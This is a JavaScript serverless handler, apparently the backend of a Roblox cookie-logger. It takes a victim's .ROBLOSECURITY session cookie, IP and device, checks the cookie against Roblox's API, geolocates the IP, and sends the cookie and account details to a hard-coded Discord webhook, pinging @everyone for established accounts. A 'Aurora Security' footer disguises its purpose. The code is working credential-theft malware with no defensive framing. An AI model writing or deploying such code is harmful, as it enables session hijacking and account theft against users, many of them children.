export default async function handler(req, res) {
  // Permitir CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { cookie, ip, device, timestamp } = req.body;

    if (!cookie) {
      return res.status(400).json({ error: 'Cookie não fornecido' });
    }

    // Limpar o cookie
    let cookieLimpo = cookie.trim().replace(/^["']|["']$/g, '');
    
    // Se não começar com o formato correto, adicionar
    if (!cookieLimpo.startsWith('_|WARNING')) {
      cookieLimpo = `_|WARNING:-DO-NOT-SHARE-THIS.--${cookieLimpo}`;
    }

    // Tentar validar com a API do Roblox
    let cookieValido = false;
    let contaRecente = false;
    let username = 'Desconhecido';
    let idadeConta = 'Desconhecida';
    let erroMsg = '';

    try {
      // Fazer requisição para API do Roblox
      const response = await fetch('https://users.roblox.com/v1/users/authenticated', {
        method: 'GET',
        headers: {
          'Cookie': `.ROBLOSECURITY=${cookieLimpo}`,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Accept': 'application/json',
        }
      });

      if (response.ok) {
        const data = await response.json();
        cookieValido = true;
        username = data.name || 'Desconhecido';
        
        // Buscar idade da conta
        try {
          const userResponse = await fetch(`https://users.roblox.com/v1/users/${data.id}`);
          if (userResponse.ok) {
            const userData = await userResponse.json();
            if (userData.created) {
              const dataCriacao = new Date(userData.created);
              const agora = new Date();
              const diffDias = Math.floor((agora - dataCriacao) / (1000 * 60 * 60 * 24));
              
              if (diffDias < 30) {
                contaRecente = true;
                idadeConta = `${diffDias} dias`;
              } else {
                idadeConta = `${Math.floor(diffDias / 30)} meses`;
              }
            }
          }
        } catch (e) {
          console.log('Erro ao buscar idade:', e);
        }
      } else {
        cookieValido = false;
        erroMsg = `Status: ${response.status}`;
      }
    } catch (error) {
      console.error('Erro na validação:', error);
      cookieValido = false;
      erroMsg = error.message;
    }

    // Buscar informações do IP
    let ipInfo = {};
    try {
      const ipResponse = await fetch(`http://ip-api.com/json/${ip}?fields=66846719`);
      ipInfo = await ipResponse.json();
    } catch (e) {
      console.error('Erro ao buscar IP:', e);
    }

    // Webhook do Discord
    const webhookURL = 'https://canary.discord.com/api/webhooks/1480235860002734152/8ZjlQOiaHtPrE9bz-yGaM_GiMC3akI7ptVW-aElQUvTjsk8jauXoaho6B1anWmy8a8QE';

    // Determinar cor e título
    let embedColor = cookieValido ? (contaRecente ? 0xffa500 : 0x00ff00) : 0xff0000;
    let embedTitle = cookieValido 
      ? (contaRecente ? '⚠️ CONTA RECENTE' : '✅ COOKIE VÁLIDO')
      : '❌ COOKIE INVÁLIDO';
    
    let embedDescription = cookieValido
      ? `Cookie de ${username} - Idade: ${idadeConta}`
      : `Falha na validação: ${erroMsg}`;

    const embed = {
      content: cookieValido && !contaRecente ? '@everyone' : null,
      embeds: [{
        title: embedTitle,
        description: embedDescription,
        color: embedColor,
        fields: [
          {
            name: '🍪 COOKIE',
            value: '```' + cookie.substring(0, 100) + '...```'
          },
          {
            name: '👤 CONTA',
            value: `\`\`\`yml
Username: ${username}
Válido: ${cookieValido ? '✅' : '❌'}
Recente: ${contaRecente ? '⚠️' : '✅'}
Idade: ${idadeConta}
\`\`\``
          },
          {
            name: '📱 DISPOSITIVO',
            value: `\`\`\`yml
Tipo: ${device}
IP: ${ip}
País: ${ipInfo.country || 'Desconhecido'}
Cidade: ${ipInfo.city || 'Desconhecido'}
\`\`\``
          },
          {
            name: '⏰ HORÁRIO',
            value: `<t:${Math.floor(Date.now() / 1000)}:F>`,
            inline: true
          }
        ],
        footer: {
          text: 'Aurora Security'
        },
        timestamp: new Date().toISOString()
      }]
    };

    // Enviar para o Discord (não precisa await para não travar)
    fetch(webhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(embed)
    }).catch(e => console.log('Erro ao enviar webhook:', e));

    // Retornar para o frontend
    return res.status(200).json({
      success: true,
      valido: cookieValido,
      contaRecente: contaRecente,
      username: username,
      idadeConta: idadeConta
    });

  } catch (error) {
    console.error('Erro geral:', error);
    return res.status(500).json({
      success: false,
      valido: false,
      error: 'Erro interno'
    });
  }
}